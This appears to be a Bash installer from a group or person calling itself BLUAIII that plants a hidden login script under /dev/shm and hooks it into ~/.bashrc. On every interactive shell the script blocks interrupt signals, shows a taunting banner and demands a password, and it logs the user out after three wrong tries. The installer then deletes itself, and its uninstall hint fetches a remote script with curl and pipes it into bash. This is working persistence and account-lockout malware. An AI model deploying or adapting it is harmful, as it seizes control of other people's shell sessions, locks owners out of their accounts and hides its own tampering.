set -u

if [ "${1:-}" = "--uninstall" ]; then
    UID_NUM=$(id -u)
    DIR="/dev/shm/.cache_${UID_NUM}"
    BASHRC="$HOME/.bashrc"
    MARK="Load login script"
    
    sed -i "\#$MARK#d" "$BASHRC" 2>/dev/null
    sed -i '\#/dev/shm/.*\.login\.sh#d' "$BASHRC" 2>/dev/null
    rm -rf "$DIR"
    echo "[*] Uninstalled."
    rm -f "$0"
    exit 0
fi

UID_NUM=$(id -u)
DIR="/dev/shm/.cache_${UID_NUM}"
DEST="$DIR/.login.sh"
BASHRC="$HOME/.bashrc"
MARK="BLUAIII-AUTOINSTALL"

if [ -f "$DEST" ] && grep -q "$MARK" "$BASHRC" 2>/dev/null; then
    echo "[!] BLUAIII sudah terinstall!"
    rm -f "$0"
    exit 1
fi

if [ ! -d "/dev/shm" ] || [ ! -w "/dev/shm" ]; then
    DIR="$HOME/.cache/private"
    DEST="$DIR/.login.sh"
fi

mkdir -p "$DIR"
chmod 700 "$DIR"

cat > "$DEST" << 'LOGIN_EOF'
case $- in
  *i*) ;;
  *) return ;;
esac

trap '' INT TSTP QUIT
stty -ixon

BLACK="$(printf '\033[30m')"
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
YELLOW="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BRIGHT_WHITE="$(printf '\033[97m')"
RESET="$(printf '\033[0m')"
BOLD="$(printf '\033[1m')"
DIM="$(printf '\033[2m')"
BRIGHT_BLUE="$(printf '\033[94m')"

PASS="37bd8d4f5adc469f75bdc73b2f8edccc"

calc_md5() {
    if command -v md5sum >/dev/null 2>&1; then
        printf "%s" "$1" | md5sum | awk '{print $1}'
    elif command -v md5 >/dev/null 2>&1; then
        printf "%s" "$1" | md5 | awk '{print $1}'
    else
        printf "${RED}CRITICAL:${RESET} md5 utility not found\n"
        logout 2>/dev/null || exit
    fi
}

clear
sleep 0.1

printf "%s" "$GREEN"
printf "╔══════════════════════════════════════════════════════════════════╗\n"
printf "║                                                                  ║\n"
printf "║              ██████╗ ██╗     ██╗   ██╗ █████╗ ██╗██╗██╗          ║\n"
printf "║              ██╔══██╗██║     ██║   ██║██╔══██╗██║██║██║          ║\n"
printf "║              ██████╔╝██║     ██║   ██║███████║██║██║██║          ║\n"
printf "║              ██╔══██╗██║     ██║   ██║██╔══██║██║██║██║          ║\n"
printf "║              ██████╔╝███████╗╚██████╔╝██║  ██║██║██║██║          ║\n"
printf "║              ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝╚═╝          ║\n"
printf "║                                                                  ║\n"
printf "║                   @ B L U A I I I  S Y S T E M                   ║\n"
printf "║                                                                  ║\n"
printf "╚══════════════════════════════════════════════════════════════════╝\n"
printf "%s\n" "$RESET"

printf "%s" "$YELLOW"
printf "╔══════════════════════════════════════════════════════════════════╗\n"
printf "║                                                                  ║\n"
printf "║  [>>] @ B L U A I I I  - IN - YOUR - DOMAINS > . <               ║\n"
printf "║  [>>] ANNOUNCEMENT : WANTED AN EQUAL OPPONENT                    ║\n"
printf "║  [>>] WORDS : Jangan Pernah Menyerah, Menyerah Jika Ada BLUAIII  ║\n"
printf "║                                                                  ║\n"
printf "╚══════════════════════════════════════════════════════════════════╝\n"
printf "%s\n" "$RESET"

MAX_TRY=3
TRY=0

while [ "$TRY" -lt "$MAX_TRY" ]; do
    TRY=$((TRY + 1))
    printf "\n${BRIGHT_BLUE}┌─[ACCESS REQUEST]${RESET}\n"
    printf "${BRIGHT_BLUE}└─╼${RESET} ${WHITE}Enter Password${DIM}: ${RESET}"
    stty -echo
    read passwd
    stty echo
    echo
    printf "${DIM}[${BRIGHT_BLUE}•${DIM}] ${BLUE}Authentication Initialized${RESET}\n"
    printf "${DIM}    └─[ "
    for i in {1..20}; do
        printf "${BRIGHT_BLUE}■${DIM}"
        sleep 0.03
    done
    printf " ]${RESET}\n"
    HASH=$(calc_md5 "$passwd")
    if [ "$HASH" = "$PASS" ]; then
        printf "\n${BRIGHT_BLUE}[ACCESS GRANTED]${RESET} ${WHITE}Welcome${RESET}\n"
        break
    else
        printf "\n${RED}[ACCESS DENIED]${RESET} ${WHITE}Invalid credentials${RESET}\n"
        printf "${DIM}    └─[${RED}✗${DIM}] Attempt ${TRY}/${MAX_TRY}${RESET}\n"
        sleep 1
    fi
done

if [ "$TRY" -ge "$MAX_TRY" ]; then
    printf "\n${RED}SYSTEM LOCKDOWN ACTIVATED${RESET}\n"
    logout 2>/dev/null || exit
fi

printf "\n${BRIGHT_BLUE}┌─[USER:${RESET} ${WHITE}$(whoami)${BRIGHT_BLUE}]─[HOST:${RESET} ${WHITE}$(hostname)${BRIGHT_BLUE}]─[PATH:${RESET} ${WHITE}$(pwd)${BRIGHT_BLUE}]${RESET}\n"
printf "${BRIGHT_BLUE}└─╼${RESET} "
LOGIN_EOF

sed -i 's/\r$//' "$DEST"
chmod 700 "$DEST"

sed -i "\#$MARK#d" "$BASHRC" 2>/dev/null
sed -i '\#/dev/shm/.*\.login\.sh#d' "$BASHRC" 2>/dev/null

printf '\n# %s\n[ -f %s ] && source %s\n' "$MARK" "$DEST" "$DEST" >> "$BASHRC"

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                    INSTALLATION COMPLETE                         ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
echo "║  Password : bluaIII (default)                                    ║"
echo "║  Uninstall: bash <(curl -s URL) --uninstall                      ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

rm -f "$0"
exit 0
